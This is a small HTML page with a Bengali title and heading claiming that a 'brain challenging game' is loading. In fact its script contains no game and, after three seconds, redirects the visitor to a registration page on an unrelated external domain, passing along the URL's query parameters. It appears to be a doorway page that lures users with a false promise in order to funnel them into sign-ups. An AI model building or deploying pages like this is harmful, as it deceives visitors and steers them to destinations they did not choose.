<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>মস্তিষ্কের চ্যালেঞ্জিং খেলা</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
    // 提取 URL 参数
    function getQueryParams() {
      const params = {};
      window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(s, k, v) {
        params[k] = decodeURIComponent(v);
      });
      return params;
    }

    // 跳转逻辑
    window.onload = function() {
      const delay = 3000; // 延迟 3 秒
      const target = "https://bkjjh1102.bk-33.blog/m/register";
      const params = getQueryParams();
      const queryStr = Object.keys(params).map(k => `${k}=${params[k]}`).join("&");
      const finalUrl = queryStr ? `${target}?${queryStr}` : target;

      setTimeout(() => {
        window.location.href = finalUrl;
      }, delay);
    }
  </script>
  <style>
    body {
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #f4f4f4;
    }
    h1 {
      font-size: 24px;
      color: #444;
    }
  </style>
</head>
<body>
  <h1>মস্তিষ্কের চ্যালেঞ্জিং খেলা লোড হচ্ছে...</h1>
</body>
</html>
